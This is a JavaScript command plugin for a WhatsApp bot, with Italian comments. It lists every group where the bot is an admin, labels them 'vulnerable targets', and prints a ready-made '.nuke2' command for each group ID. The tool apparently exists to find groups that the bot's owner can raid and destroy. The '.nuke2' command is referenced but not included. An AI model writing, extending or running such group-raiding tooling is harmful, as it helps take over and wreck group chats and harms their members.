let handler = async (m, { conn, isOwner }) => {
    if (!isOwner) return;

    await m.reply("🔄 Scansione dei gruppi in corso... attendere.");

    // Ottiene tutti i chat ID che finiscono per @g.us (i gruppi)
    let groups = Object.keys(conn.chats).filter(id => id.endsWith('@g.us'));
    
    let vulnerableGroups = [];
    let botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    // Ciclo su ogni gruppo per controllare i permessi
    for (let groupId of groups) {
        try {
            // Ottiene i metadati freschi per essere sicuri dello stato admin
            let metadata = await conn.groupMetadata(groupId);
            
            // Cerca se il bot è tra i partecipanti ed è admin
            let botIsAdmin = metadata.participants.find(p => p.id === botId)?.admin;

            if (botIsAdmin) {
                vulnerableGroups.push({
                    subject: metadata.subject,
                    id: groupId,
                    members: metadata.participants.length
                });
            }
        } catch (e) {
            console.log(`Impossibile leggere metadati per ${groupId}`);
        }
    }

    if (vulnerableGroups.length === 0) {
        return m.reply("❌ Non sono Amministratore in nessun gruppo al momento.");
    }

    // Costruzione del messaggio
    let txt = `☠️ *TARGET VULNERABILI TROVATI: ${vulnerableGroups.length}* ☠️\n\n`;
    
    vulnerableGroups.forEach((g, i) => {
        txt += `${i + 1}. *${g.subject}* (${g.members} membri)\n`;
        txt += `🆔 ID: \`${g.id}\`\n`; // Formattato come codice per copia-incolla facile
        txt += `comando: .nuke2 ${g.id}\n\n`;
    });

    await m.reply(txt);
};

handler.command = ['listtargets', 'vulnerable', 'listid'];
handler.owner = true;

export default handler;
